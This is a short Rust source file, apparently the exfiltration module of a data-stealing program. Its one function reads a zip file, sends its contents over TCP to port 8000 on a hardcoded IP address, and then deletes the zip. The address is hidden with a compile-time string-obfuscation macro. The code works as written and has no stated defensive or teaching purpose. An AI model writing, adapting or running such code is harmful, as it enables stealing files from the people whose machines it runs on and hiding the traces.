use goldberg::goldberg_string;
use std::fs;
use std::fs::File;
use std::io::{BufReader, Read, Write};
use std::net::TcpStream;

pub fn send_file_ip(zipname: String) {
    let port = 8000;

    let file = File::open(zipname.as_str()).expect("Failed to open file");
    let mut reader = BufReader::new(file);
    let mut file_contents = Vec::new();
    reader
        .read_to_end(&mut file_contents)
        .expect("Failed to read file");

    let mut stream = TcpStream::connect(format!("{}:{}", goldberg_string!("192.168.33.103"), port))
        .expect("Failed to connect to server");
    stream.write_all(&file_contents).unwrap();
    stream.flush().unwrap();

    fs::remove_file(zipname).unwrap();
}
